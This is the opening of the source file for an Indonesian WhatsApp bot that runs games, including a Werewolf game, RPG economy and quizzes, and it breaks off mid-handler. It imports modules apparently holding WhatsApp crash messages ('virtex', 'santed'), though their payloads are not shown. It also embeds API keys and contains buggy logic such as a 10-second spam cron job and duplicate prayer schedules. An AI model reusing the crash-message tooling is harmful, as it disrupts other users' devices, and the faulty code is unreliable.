/**
   * Create By Dika Ardnt.
   * Contact Me on wa.me/6288292024190
   * Follow https://github.com/DikaArdnt
*/
require('./lib/listmenu')
require('./config')
const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl } = modul;
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, delay } = require('@adiwajshing/baileys')
const path = require('path')
const { Configuration, OpenAIApi } = require("openai");
const os = require('os')
const { JSDOM } = require('jsdom')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const instagramGetUrl = require("instagram-url-direct")
const hxz = require('hxz-api')
const scp1 = require('./lib/scp')
const scp = require('./lib/udin')
const { santedpc } = require('./vit/santedpc')
const { santedgc } = require('./vit/santedgc')
const anon = require('./lib/menfess')
const {
    adduang,
    adduangUser,
    checkuangUser,
    confirmuang
  } = require('./lib/atm.js')
const { checkPetualangUser, addInventori, addBesi, sellBesi, getBesi, addDm, sellDm, getDm, addEmas, sellEmas, getEmas, addFish, sellFish, getFish, addUmpan, sellUmpan, getUmpan } = require("./lib/rpg/rpgfunction");
function randomNomor(angka){
return Math.floor(Math.random() * angka) + 1
}
function randomNo(angka){
    return Math.floor(Math.random() * angka) + 500
    }
const http = randomNomor(500) //MENDAPATKAN UANG KETIKA MENANG NAH INI
const http1 = randomNo(3000)// ohh ini, okok
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, reSize } = require('./lib/myfunc')
const { werewolf } = require("./lib/werewolf")
const nyoutube = ('Jangan lupa donasi >_<')
let cron = require('node-cron')
const { ngazap } = require('./baseikal/virtex/ngazap.js')
const kalimage = fs.readFileSync ('./baseikal/image/hwmodsgans.jpg')
const iklans = require('./iklan.js')
const prem = []

const an = process.memoryUsage();
console.log('RSS :'+an.rss);

//DATABASE
let limit = JSON.parse(fs.readFileSync('./database/user/limit.json'));
let register = JSON.parse(fs.readFileSync('./database/user/register.json'));
let antilink = JSON.parse(fs.readFileSync('./database/grup/antilink.json'));
//==============================> RPG <==============================//
let uang = JSON.parse(fs.readFileSync('./database/user/uang.json'));
let dbdaily = JSON.parse(fs.readFileSync('./database/user/daily.json'));
let _RPG = JSON.parse(fs.readFileSync('./database/rpg/inventori.json'));
var Fish = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐡','🐙']
//SETTING
const limitawal = global.limitawal

//read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let ntvirtex = db.data.others.ntvirtex = []

const { daily } = require('./lib/daily')
cron.schedule('*/10 * * * * *', () => {
    var unicorn = fs.readFileSync('./bluzmedia/image/kuda.jpg')
   bluz.sendMessage(m.chat, { image: unicorn, caption: `Testing Sahaja` }, { quoted: m })
});


const adzan = require('./adzan.js')
//https://crontab.guru/
//SUBUH
cron.schedule('12 04 * * *', () => {
    m.reply(adzan.kpsbh())
    console.log('Reseted Limit')
}, {
    scheduled: true,
    timezone: "Asia/Jakarta"
})
//DZUHUR
cron.schedule('12 04 * * *', () => {
    m.reply(adzan.kpsbh())
    console.log('Reseted Limit')
}, {
    scheduled: true,
    timezone: "Asia/Jakarta"
})
//ASHAR
cron.schedule('12 04 * * *', () => {
    m.reply(adzan.kpsbh())
    console.log('Reseted Limit')
}, {
    scheduled: true,
    timezone: "Asia/Jakarta"
})
//MAGHRIB
cron.schedule('12 04 * * *', () => {
    m.reply(adzan.kpsbh())
    console.log('Reseted Limit')
}, {
    scheduled: true,
    timezone: "Asia/Jakarta"
})
//ISYA
cron.schedule('12 04 * * *', () => {
    m.reply(adzan.kpsbh())
    console.log('Reseted Limit')
}, {
    scheduled: true,
    timezone: "Asia/Jakarta"
})
// var cron = require('node-cron');
// cron.schedule('*/25 * * * * *', () => {
//     m.reply(iklans.iklan1())
// });

//[================================< DATABASE >==========================]
 //DB AUTO STICKER
 const _autostick = JSON.parse(fs.readFileSync('./database/autostickpc.json'))
 let autosticker = JSON.parse(fs.readFileSync('./database/grup/autosticker.json'))
 let antivirtex = JSON.parse(fs.readFileSync('./database/grup/antivirtex.json'))
 //DBRPLY
 let setik = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
 let vien = JSON.parse(fs.readFileSync('./database/autoreply/audio.json'))
 let imagi = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
 let videox = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))

        //waktu
        let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
        const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)	

        // // Menulogo
        // let picaks = [flaming,fluming,flarun,flasmurf]
		// let picak = picaks[Math.floor(Math.random() * picaks.length)]
// Language
const  { ind } = require(`./language`)
lang = ind // Language
//lang = rgin
// Type Menu
typemenu = 'image'

var zzkey = ['d0f31405eeea','7f44df3b91','1a343834a5','4f3bb772c1','7784e9255d','a727f9b0649d','f3cc850cd234','12b863e0ec','29fb25a35574','2848050dbc']
var zzzkey = zzkey[Math.floor(Math.random() * zzkey.length)]

const pagii = (data) => {
    if (data.dead.length < 1) {
        return `🌤 Mentari telah terbit, tidak ada korban berjatuhan malam tadi ,(‾˛‾") warga kembali melakukan aktifitasnya seperti biasa. ☀️ 90 detik tersisa sebelum waktu penentuan, para warga dipersilahkan untuk menghasut warga lainnya untuk saling membakar ~(˘▾˘~). 🗓 Hari ke ${data.day}`
    } else {
        a = ''
        d = ''
        e = []
        f = []
        for (let i = 0; i < data.dead.length; i++) {
            var b = data.player.findIndex(x => x.idny === data.dead[i])
            if (data.player[b].effect.includes('guardian')) {
                e.push(data.player[b].id)
            } else {
                f.push(data.player[b].id)
            }
        }
        for (let i = 0; i < f.length; i++) {
            if (i === f.length - 1) {
                if (f.length > 1) {
                    a += `dan @${f[i].replace('@s.whatsapp.net', '')}`
                } else {
                    a += `@${f[i].replace('@s.whatsapp.net', '')}`
                }
            } else if (i === f.length - 2) {
                a += `@${f[i].replace('@s.whatsapp.net', '')}`
            } else {
                a += `@${f[i].replace('@s.whatsapp.net', '')}, `
            }
        }
        for (let i = 0; i < e.length; i++) {
            if (i === e.length - 1) {
                if (e.length > 1) {
                    d += `dan @${e[i].replace('@s.whatsapp.net', '')}`
                } else {
                    d += `@${e[i].replace('@s.whatsapp.net', '')}`
                }
            } else if (i === e.length - 2) {
                d += `@${e[i].replace('@s.whatsapp.net', '')}`
            } else {
                d += `@${e[i].replace('@s.whatsapp.net', '')}, `
            }
        }
        textnya = `🌤 Pagi telah tiba, warga desa menemukan ${data.dead.length > 1 ? 'beberapa' : '1'} mayat di tumpukan puing dan darah berceceran. ${a} telah mati!${d.length > 1 ? ` dan ${d} nyaris dibunuh, namun guardian angel berhasil melindunginya.` : ''}\n\n☀️ Siang datang. Matahari tepat di atas kepala. Warga desa mempunyai 90 detik untuk saling tuduh, membela diri atau menyebarkan gosip ~(˘▾˘~). 🗓 Hari ke ${data.day}`
        return textnya
    }
}

async function win(x, t, tod) {
    const sesinya = x.id
    if (werewolf.getWinner(x.id).status === false || x.iswin === false) {
        let textnya = `werewolf Win\n\nTeam werewolf\n`
        let ment = []
        var duitdpt = randomNo(30000)
        var duitdpt2 = randomNo(500)
        for (let i = 0; i < x.player.length; i++) {
            if (!x.player[i].role === "werewolf" && !x.player[i].role === 'sorcerer') {
                adduangUser(x.player[i].id, duitdpt2)

            } else if (x.player[i].role === "sorcerer" || x.player[i].role === "werewolf") {
                textnya += `${x.player[i].idny}. @${x.player[i].id.replace("@s.whatsapp.net", "")}\nRole: ${x.player[i].role}\n`
                ment.push(x.player[i].id)
                adduangUser(x.player[i].id, duitdpt)
            }
        }
        textnya += `\nNote: masing masing dari pemenang akan mendapatkan uang sebanyak ${duitdpt} dan yang kalah ${duitdpt2}`
        werewolf.ExitGame(sesinya)
        return tod.sendMessage(sesinya, { text: textnya, mentions: ment });
    } else if (werewolf.getWinner(x.id).status === true) {
        var duitdpt = randomNo(30000)
        var duitdpt2 = randomNo(500)
        let textnya = `Team Baik Win\n\nTeam Baik\n`
        let ment = []
        for (let i = 0; i < x.player.length; i++) {
            if (x.player[i].role === "warga" || x.player[i].role === "guardian" || x.player[i].role === "seer") {
                textnya += `${x.player[i].idny}. @${x.player[i].id.replace("@s.whatsapp.net", "")}\nRole: ${x.player[i].role}\n`
                ment.push(x.player[i].id)
                adduangUser(x.player[i].id, duitdpt)
            }else if(x.player[i].role === 'werewolf' || x.player[i].role === 'sorcerer'){
                adduangUser(x.player[i].id, duitdpt2)
            }
        }
        textnya += `\nNote: masing masing dari pemenang akan mendapatkan uang sebanyak ${duitdpt} dan yang kalah ${duitdpt2}`
        werewolf.ExitGame(sesinya)
        return tod.sendMessage(sesinya, { text: textnya, mentions: ment })
    }
}

async function habis_vote(tod, x) {
    let tok1 = ""
    let tok2 = ""
    let membernya = []
    werewolf.shortPlayer(x.id)
    for (let i = 0; i < x.player.length; i++) {
        tok1 += `[${x.player[i].idny}] @${x.player[i].id.replace("@s.whatsapp.net", "")}${x.player[i].isdead === true ? `[Dead, ${x.player[i].role}]` : ""}\n`
        membernya.push(x.player[i].id)
    }
    for (let i = 0; i < x.player.length; i++) {
        tok2 += `[${x.player[i].idny}] @${x.player[i].id.replace("@s.whatsapp.net", "")} ${x.player[i].role === 'werewolf' || x.player[i].role === "sorcerer" ? `[${x.player[i].isdead === true ? `Dead, ${x.player[i].role}]` : `${x.player[i].role}]`}` : ''}\n`
        membernya.push(x.player[i].id)
    }
    for (let i = 0; i < x.player.length; i++) {
        if (x.player[i].isdead != true) {
            if (x.player[i].role === "werewolf") {
                if (x.player[i].isdead != true) {
                    var textnya = `Kamu adalah Werewolf (Srigala) ${werewolf.emoji_role('werewolf')}, silahkan tunjuk satu orang yang ingin kamu makan pada malam hari ini\nList Player: ${tok2}`
                    let row = []
                    for (let k = 0; k < x.player.length; k++) {
                        row.push({ title: `Kill Player ${x.player[k].idny}`, rowId: `.ww kill ${x.player[k].idny}`, description: `Untuk membunuh player ${x.player[k].idny}` })
                    }
                    const sections = [{ title: "Werewolf Game", rows: row }]
                    const listMessage = {
                        text: textnya,
                        footer: `Player Hidup: ${werewolf.playerHidup(x)} Player Mati: ${werewolf.playerMati(x)}`,
                        title: "Werewolf Game",
                        buttonText: "Clik here!",
                        sections,
                        mentions: membernya
                    }
                    tod.sendMessage(x.player[i].id, listMessage)
                }
            } else if (x.player[i].role === "warga") {
                if (x.player[i].isdead != true) {
                    let textnya = `Kamu adalah Villager (Warga/Orang Desa) ${werewolf.emoji_role('warga')}, Silakan masuk kerumah masing masing.\nList Player${tok1}`
                    tod.sendMessage(x.player[i].id, { text: textnya, mentions: membernya })
                }
            } else if (x.player[i].role === "seer") {
                if (x.player[i].isdead != true) {
                    let textnya = `Kamu adalah Seer (Penerawang) ${werewolf.emoji_role('seer')}. Bermodalkan kemenyan dan jampi-jampi, kamu bisa mengetahui peran pemain pilihanmu.\nList Player: ${tok1}`
                    let row = []
                    for (let k = 0; k < x.player.length; k++) {
                        row.push({ title: `Cek Player ${x.player[k].idny}`, rowId: `.ww dreamy ${x.player[k].idny}`, description: `Untuk melihat identitas player ${x.player[k].idny}` })
                    }
                    const sections = [{ title: "Werewolf Game", rows: row }]
                    const listMessage = {
                        text: textnya,
                        footer: `Player Hidup: ${werewolf.playerHidup(x)} Player Mati: ${werewolf.playerMati(x)}`,
                        title: "Werewolf Game",
                        buttonText: "Clik here!",
                        sections,
                        mentions: membernya
                    }
                    tod.sendMessage(x.player[i].id, listMessage)
                }
            } else if (x.player[i].role === "guardian") {
                if (x.player[i].isdead != true) {
                    let textnya = `Kamu adalah Guardian Angel (Malaikat Pelindung) ${werewolf.emoji_role('guardian')}, Silahkan Pilih salah 1 player Yang ingin kamu Lindungi\nList Player: ${tok1}`
                    let row = []
                    for (let k = 0; k < x.player.length; k++) {
                        row.push({ title: `Lindungi Player ${x.player[k].idny}`, rowId: `.ww deff ${x.player[k].idny}`, description: `Untuk melindungi player ${x.player[k].idny}` })
                    }
                    const sections = [{ title: "Werewolf Game", rows: row }]
                    const listMessage = {
                        text: textnya,
                        footer: `Player Hidup: ${werewolf.playerHidup(x)} Player Mati: ${werewolf.playerMati(x)}`,
                        title: "Werewolf Game",
                        buttonText: "Clik here!",
                        sections,
                        mentions: membernya
                    }
                    tod.sendMessage(x.player[i].id, listMessage)
                }
            } else if (x.player[i].role === "sorcerer") {
                if (x.player[i].isdead != true) {
                    let textnya = `Kamu adalah Sorcerer (Penyihir) ${werewolf.emoji_role('sorcerer')}, Silakan Pilih 1 Orang Yang Ingin kamu Buka Identitasnya\nList Player: ${tok2}`
                    let row = []
                    for (let k = 0; k < x.player.length; k++) {
                        row.push({ title: `Cek Player ${x.player[k].idny}`, rowId: `.ww sorcerer ${x.player[k].idny}`, description: `Untuk melihat identitas player ${x.player[k].idny}` })
                    }
                    const sections = [{ title: "Werewolf Game", rows: row }]
                    const listMessage = {
                        text: textnya,
                        footer: `Player Hidup: ${werewolf.playerHidup(x)} Player Mati: ${werewolf.playerMati(x)}`,
                        title: "Werewolf Game",
                        buttonText: "Clik here!",
                        sections,
                        mentions: membernya
                    }
                    tod.sendMessage(x.player[i].id, listMessage)
                }
            }
        }
    }
}

async function pagi(conn, x, vote) {
    let ment = []
    for (let i = 0; i < x.player.length; i++) {
        ment.push(x.player[i].id)
    }
    werewolf.shortPlayer(x.id)
    werewolf.killww(x.id, x.dead)
    werewolf.shortPlayer(x.id)
    werewolf.changeDay(x.id)
    return conn.sendMessage(x.id, { text: pagii(x), mentions: ment })
}
async function voting(conn, x, vote) {
    let row = []
    let ment = []
    werewolf.voteStart(x.id)
    textnya = '🌥 Senja telah tiba. Seluruh warga berkumpul di balai desa untuk memilih siapa yang akan dieksekusi. Sebagian warga terlihat sibuk menyiapkan alat penyiksaan untuk malam ini. Kalian mempunyai waktu selama 90 detik untuk memilih! Hati-hati, jangan sampai disetir orang yang salah!\nList Player:\n'
    werewolf.shortPlayer(x.id)
    for (let i = 0; i < x.player.length; i++) {
        row.push({ title: `Vote player ${x.player[i].idny}`, rowId: `.ww vote ${x.player[i].idny}`, description: `Untuk memvote player ${x.player[i].idny}` })
        textnya += `[${x.player[i].idny}] @${x.player[i].id.replace("@s.whatsapp.net", "")} [${x.player[i].isdead === true ? `Dead ${x.player[i].role}` : "Life"}]\n`
        ment.push(x.player[i].id)
    }
    const sections = [{ title: "Werewolf Game - Voting", rows: row }]
    const listMessage = {
        text: textnya,
        footer: `Player Hidup: ${werewolf.playerHidup(x)} Player Mati: ${werewolf.playerMati(x)}`,
        title: "Werewolf Game - Voting",
        buttonText: "Clik here!",
        sections,
        mentions: ment
    }
    werewolf.dayVoting(x.id)
    werewolf.clearAll(x.id)
    werewolf.clearAllSTATUS(x.id)
    return conn.sendMessage(x.id, listMessage)
}
async function malam(conn, x, vote) {
    var hasil_vote = werewolf.voteResult(x.id)
    if (hasil_vote === 0) {
        textnya = `┐(ˇ.ˇ")┌ Terlalu galau menentukan pilihan. Warga pun pulang ke rumah masing-masing, tidak ada yang dieksekusi hari ini. 🌙 Bintang menampakkan diri, malam yang mencekam telah datang. Semoga tidak ada yang mati pada malam ini. Pemain malam hari: kalian punya 90 detik untuk beraksi!`
        return conn.sendMessage(x.id, { text: textnya }).then(() => {
            werewolf.changeDay(x.id)
            werewolf.voteDone(x.id)
            werewolf.resetVote(x.id)
            werewolf.clearAllVote(x.id)
            if (werewolf.getWinner(x.id).status != null) return win(x, 1, conn,)
        })
    } else if (hasil_vote === 1) {
        textnya = `Warga desa telah memilih, namun hasilnya seri.\n\n🌙 Bulan bersinar terang malam ini, warga desa beristirahat di kediaman masing masing. Sebagian telah tepar di kasurnya, sebagian masih stalking mantan, dan sisanya punya pekerjaan di malam hari. Pemain malam hari: kalian punya 90 detik untuk beraksi!`
        return conn.sendMessage(x.id, { text: textnya }).then(() => {
            werewolf.changeDay(x.id)
            werewolf.voteDone(x.id)
            werewolf.resetVote(x.id)
            werewolf.clearAllVote(x.id)
            if (werewolf.getWinner(x.id).status != null) return win(x, 1, conn)
        })
    } else if (hasil_vote != 0 && hasil_vote != 1) {
        textnya = `🔥 Warga desa telah memilih dan sepakat. @${hasil_vote.id.replace("@s.whatsapp.net", "")} dieksekusi mati.💀 @${hasil_vote.id.replace("@s.whatsapp.net", "")} adalah ${hasil_vote.role}${werewolf.emoji_role(hasil_vote.role)}\n🌙 Bulan bersinar terang malam ini, warga desa beristirahat di kediaman masing masing. Sebagian telah tepar di kasurnya, sebagian masih stalking mantan, dan sisanya punya pekerjaan di malam hari. Pemain malam hari: kalian punya 90 detik untuk beraksi!`
        werewolf.voteKill(x.id)
        let ment = []
        ment.push(hasil_vote.id)
        return conn.sendMessage(x.id, { text: textnya, mentions: ment }).then(() => {
            werewolf.changeDay(x.id)
            werewolf.voteDone(x.id)
            werewolf.resetVote(x.id)
            werewolf.clearAllVote(x.id)
            if (werewolf.getWinner(x.id).status != null) return win(x, 1, conn)
        })
    }
}
async function skill(conn, x, vote) {
    console.log('xxxxx' + x)
    if (werewolf.getWinner(x.id).status != null || x.win != null) {
        return win(x, 1, conn);
    } else {
        if(!x) return
        if(!x.player) return
        if(x.win != null) return
        let tok1 = "\n"
        let tok2 = "\n"
        let membernya = []
        werewolf.shortPlayer(x.id)
        for (let i = 0; i < x.player.length; i++) {
            tok1 += `[${x.player[i].idny}] @${x.player[i].id.replace("@s.whatsapp.net", "")}${x.player[i].isdead === true ? `[Dead, ${x.player[i].role}]` : `[Life]`}\n`
            membernya.push(x.player[i].id)
        }
        for (let i = 0; i < x.player.length; i++) {
            tok2 += `[${x.player[i].idny}] @${x.player[i].id.replace("@s.whatsapp.net", "")} ${x.player[i].role === 'werewolf' || x.player[i].role === "sorcerer" ? `${x.player[i].isdead === true ? `[Dead, ${x.player[i].role}]` : `[Life, ${x.player[i].role}]`}` : '[Life]'}\n`
            membernya.push(x.player[i].id)
        }
        for (let i = 0; i < x.player.length; i++) {
            if (x.player[i].role === "werewolf") {
                if (x.player[i].isdead != true) {
                    var textnya = `Kamu adalah Werewolf (Srigala) ${werewolf.emoji_role('werewolf')}, silahkan tunjuk satu orang yang ingin kamu makan pada malam hari ini\nList Player: ${tok2}`
                    let row = []
                    for (let k = 0; k < x.player.length; k++) {
                        row.push({ title: `Kill Player ${x.player[k].idny}`, rowId: `.ww kill ${x.player[k].idny}`, description: `Untuk membunuh player ${x.player[k].idny}` })
                    }
                    const sections = [{ title: "Werewolf Game", rows: row }]
                    const listMessage = {
                        text: textnya,
                        footer: `Player Hidup: ${werewolf.playerHidup(x)} Player Mati: ${werewolf.playerMati(x)}`,
                        title: "Werewolf Game",
                        buttonText: "Clik here!",
                        sections,
                        mentions: membernya
                    }
                    conn.sendMessage(x.player[i].id, listMessage)
                }
            } else if (x.player[i].role === "warga") {
                if (x.player[i].isdead != true) {
                    let textnya = `Kamu adalah Villager (Warga/Orang Desa) ${werewolf.emoji_role('warga')}, Silakan masuk kerumah masing masing.\nList Player${tok1}`
                    conn.sendMessage(x.player[i].id, { text: textnya, mentions: membernya })
                }
            } else if (x.player[i].role === "seer") {
                if (x.player[i].isdead != true) {
                    let textnya = `Kamu adalah Seer (Penerawang) ${werewolf.emoji_role('seer')}. Bermodalkan kemenyan dan jampi-jampi, kamu bisa mengetahui peran pemain pilihanmu.\nList Player: ${tok1}`
                    let row = []
                    for (let k = 0; k < x.player.length; k++) {
                        row.push({ title: `Cek Player ${x.player[k].idny}`, rowId: `.ww dreamy ${x.player[k].idny}`, description: `Untuk melihat identitas player ${x.player[k].idny}` })
                    }
                    const sections = [{ title: "Werewolf Game", rows: row }]
                    const listMessage = {
                        text: textnya,
                        footer: `Player Hidup: ${werewolf.playerHidup(x)} Player Mati: ${werewolf.playerMati(x)}`,
                        title: "Werewolf Game",
                        buttonText: "Clik here!",
                        sections,
                        mentions: membernya
                    }
                    conn.sendMessage(x.player[i].id, listMessage)
                }
            } else if (x.player[i].role === "guardian") {
                if (x.player[i].isdead != true) {
                    let textnya = `Kamu adalah Guardian Angel (Malaikat Pelindung) ${werewolf.emoji_role('guardian')}, Silahkan Pilih salah 1 player Yang ingin kamu Lindungi\nList Player: ${tok1}`
                    let row = []
                    for (let k = 0; k < x.player.length; k++) {
                        row.push({ title: `Lindungi Player ${x.player[k].idny}`, rowId: `.ww deff ${x.player[k].idny}`, description: `Untuk melindungi player ${x.player[k].idny}` })
                    }
                    const sections = [{ title: "Werewolf Game", rows: row }]
                    const listMessage = {
                        text: textnya,
                        footer: `Player Hidup: ${werewolf.playerHidup(x)} Player Mati: ${werewolf.playerMati(x)}`,
                        title: "Werewolf Game",
                        buttonText: "Clik here!",
                        sections,
                        mentions: membernya
                    }
                    conn.sendMessage(x.player[i].id, listMessage)
                }
            } else if (x.player[i].role === "sorcerer") {
                if (x.player[i].isdead != true) {
                    let textnya = `Kamu adalah Sorcerer (Penyihir) ${werewolf.emoji_role('sorcerer')}, Silakan Pilih 1 Orang Yang Ingin kamu Buka Identitasnya\nList Player: ${tok2}`
                    let row = []
                    for (let k = 0; k < x.player.length; k++) {
                        row.push({ title: `Cek Player ${x.player[k].idny}`, rowId: `.ww sorcerer ${x.player[k].idny}`, description: `Untuk melihat identitas player ${x.player[k].idny}` })
                    }
                    const sections = [{ title: "Werewolf Game", rows: row }]
                    const listMessage = {
                        text: textnya,
                        footer: `Player Hidup: ${werewolf.playerHidup(x)} Player Mati: ${werewolf.playerMati(x)}`,
                        title: "Werewolf Game",
                        buttonText: "Clik here!",
                        sections,
                        mentions: membernya
                    }
                    conn.sendMessage(x.player[i].id, listMessage)
                }
            }
        }
    }
}

async function run(conn, id) {
    console.log('idddd' + id)
    while (werewolf.getWinner(id).status === null) {
        if (werewolf.getWinner(id).status != null) {
            win(werewolf.getWinner(id), 1, conn);
            break;
        } else {
            await sleep(90000);
        };
        if (werewolf.getWinner(id).status != null) {
            win(werewolf.getWinner(id), 1, conn);
            break;
        }else {
            await pagi(conn, werewolf.dataSesi(id), habis_vote);
        };
        if (werewolf.getWinner(id).status != null) {
            win(werewolf.getWinner(id), 1, conn);
            break;
        }else {
            await sleep(90000);
        };
        if (werewolf.getWinner(id).status != null) {
            win(werewolf.getWinner(id), 1, conn);
            break;
        }else {
            await voting(conn, werewolf.dataSesi(id), habis_vote);
        };
        if (werewolf.getWinner(id).status != null) {
            win(werewolf.getWinner(id), 1, conn);
            break;
        }else {
            await sleep(90000);
        };
        if (werewolf.getWinner(id).status != null) {
            win(werewolf.getWinner(id), 1, conn);
            break;
        }else {
            await malam(conn, werewolf.dataSesi(id), habis_vote);
        };
        if (werewolf.getWinner(id).status != null) {
            win(werewolf.getWinner(id), 1, conn);
            break;
        }else {
            await skill(conn, werewolf.dataSesi(id), habis_vote);
        };
        if (werewolf.getWinner(id).status != null) break;
    }
    await win(werewolf.dataSesi(id), 1, conn);
}

module.exports = bluz = async (bluz, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ''
        const ujicommnad1 = `${body.split(" ")[0]} ${body.split(" ")[1]}`
        const ujicommand3 = `${body.split(" ")[0]} ${body.split(" ")[1]} ${body.split(" ")[2]}`
        const commandd = body.trim().split(/ +/).shift().toLowerCase()
        const command1 = ujicommnad1.toLowerCase()
        const command2 = body.toLowerCase()
        const command3 = ujicommand3.toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await bluz.decodeJid(bluz.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const from = mek.key.remoteJid
        const isRegister = register.includes(m.sender)
        const isDaily = daily.checkData(dbdaily, m.sender) ? true : false
        const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
            }
        const point = Math.floor(Math.random() * 1) + 0
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
        //const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
        // Group
        const groupMetadata = m.isGroup ? await bluz.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
        const isAutoStick = _autostick.includes(from)
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const isAntiVirtex = m.isGroup ? antivirtex.includes(from) : false
        const isAntilink = m.isGroup ? antilink.includes(from) : false
        const isPrem = prem.includes(m.sender) || isCreator
	
	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = db.data.users[m.sender]
            if (typeof user !== 'object') db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = db.data.chats[m.chat]
            if (typeof chats !== 'object') db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
            }
		
	    let setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
	    if (!('anticall' in setting)) setting.anticall = true
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false
		if (!('templateLocation' in setting)) setting.templateLocation = false
	    } else global.db.data.settings[botNumber] = {
	    anticall: true,
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
		templateLocation: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }

        if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
            let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
            if (room.terjawab[index]) return !0
            room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
